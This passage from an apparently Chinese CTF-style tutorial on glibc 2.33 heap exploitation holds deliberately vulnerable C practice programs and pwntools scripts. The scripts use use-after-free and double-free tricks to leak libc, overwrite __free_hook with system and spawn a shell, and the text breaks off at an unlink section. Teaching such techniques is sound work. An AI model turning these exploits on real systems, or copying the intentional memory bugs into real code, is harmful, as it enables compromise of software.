class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用uaf直接获取libc地址和chunk地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;uaf&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4a8</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=d-<span class="hljs-number">0x470</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_0=calc_fd(heap_d,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br>heap_2=heap_0+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x4b0</span><br>edit(<span class="hljs-number">2</span>,p64(en_fd(heap_2+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="double-free">double free</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    使一个chunk的地址在bin中存在两次记录</span><br><span class="hljs-comment">    如果程序只允许在创建chunk时写入数据</span><br><span class="hljs-comment">    则在创建chunk时就可以修改bin结构</span><br><span class="hljs-comment">    double free需要和其他方法结合才能使用</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc double_free.c -o double_free</span><br><span class="hljs-comment">    这个例子是结合uaf与double free</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">22</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_data</span><span class="hljs-params">(<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> len)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>              <span class="hljs-keyword">return</span>;<br>        data[i]=buf[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;<span class="hljs-number">21</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    get_data(chunk_list[ind],size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind&gt;<span class="hljs-number">21</span> || chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind&gt;<span class="hljs-number">21</span> || chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ; <br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="double-free-示例分析">double free 示例分析</h3>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-double_free-4.jpg" srcset="/img/loading.gif" lazyload alt="get_data函数代码" title="get_data函数代码"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在libc2.28之后对tcache bin进行了double free检测</span><br><span class="hljs-string">    所以不能直接通过tcache bin构造double free</span><br><span class="hljs-string">    不过也只是在一开始将chunk放入tcache bin时进行检测</span><br><span class="hljs-string">    而且没将tcache bin与fast bin联动起来</span><br><span class="hljs-string">    所以可以先将chunk放入fast bin中</span><br><span class="hljs-string">    然后随便创建几个chunk，减少一点tcache bin中的chunk数</span><br><span class="hljs-string">    然后将fast bin中的chunk放入tcache bin</span><br><span class="hljs-string">    这时在获取chunk时获取的chunk的地址与fast bin中的地址相同</span><br><span class="hljs-string">    这时将这个chunk的fd设置为自己本身</span><br><span class="hljs-string">    则可以将tcache bin中填入两个同一个chunk</span><br><span class="hljs-string">    这时再创建一个chunk，后面就可以在任意地址创建chunk了</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;double_free&#x27;</span>)<br>gdb.attach(p)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x61</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x4a8</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x58</span>,payload)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x58</span>,payload)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x500</span>)<br>show(<span class="hljs-number">7</span>)<br>libc_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>main_arena=libc_d-<span class="hljs-number">0x470</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-comment">## tcache ##</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>)<br><br>show(<span class="hljs-number">1</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_0=calc_fd(heap_d,<span class="hljs-number">0x290</span>+<span class="hljs-number">0x10</span>)-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br>heap=heap_0-<span class="hljs-number">0x290</span><br>heap_8=heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x60</span>*<span class="hljs-number">7</span>+<span class="hljs-number">0x4b0</span><br><br><span class="hljs-comment">## fast ##</span><br>free(<span class="hljs-number">8</span>)<br><br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x58</span>,p64(en_fd(heap_8+<span class="hljs-number">0x10</span>,heap_8)))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">16</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">17</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">18</span>,<span class="hljs-number">0x58</span>)<br><br>add(<span class="hljs-number">19</span>,<span class="hljs-number">0x58</span>,p64(en_fd(heap_8+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">20</span>,<span class="hljs-number">0x58</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">21</span>,<span class="hljs-number">0x58</span>,p64(system))<br>free(<span class="hljs-number">20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="unlink">unlink</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    利用内存管理中合并两个相邻的空闲chunk的代码unlink</span><br><span class="hljs-comment">    来向程序中用来储存chunk地址的数组中写入这个数组的地址</span><br><span class="hljs-comment">    这样就可以修改数组中成员指向的位置</span><br><span class="hljs-comment">    就可以在任意地址进行读写了</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* gcc unlink.c -no-pie -o unlink */</span><br><span class="hljs-meta">#<span 